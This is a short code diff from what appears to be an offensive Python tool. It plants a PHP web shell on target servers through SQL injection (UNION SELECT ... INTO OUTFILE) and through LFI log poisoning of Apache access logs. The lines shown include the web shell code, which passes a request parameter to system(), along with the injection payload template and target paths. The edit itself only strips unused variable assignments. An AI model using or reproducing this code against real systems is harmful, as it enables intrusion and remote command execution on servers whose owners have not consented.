@@ -23,7 +23,7 @@ def sqli_into_outfile(url: str, param: str, sess: requests.Session,
         "/tmp/shell.php",
     ]
     php_code = '<?php $c=$_GET["c"]??$_POST["c"];system($c);?>'
-    php_b64 = base64.b64encode(php_code.encode()).decode()
+    base64.b64encode(php_code.encode()).decode()
 
     outfile_payloads = [
         "' UNION SELECT '%s', '', '' INTO OUTFILE '%s' -- -",
@@ -94,7 +94,7 @@ def deploy_webshell_lfi(url: str, param: str, sess: requests.Session,
                          timeout: float = 15.0) -> Dict:
     result = {"success": False, "method": "lfi_webshell", "webshell_url": None, "evidence": []}
     php_code = '<?php $c=$_GET["c"]??$_POST["c"];system($c);?>'
-    poison_value = "SHELL_%s" % base64.b64encode(os.urandom(4)).decode()
+    "SHELL_%s" % base64.b64encode(os.urandom(4)).decode()
 
     log_paths = [
         "/var/log/apache2/access.log",
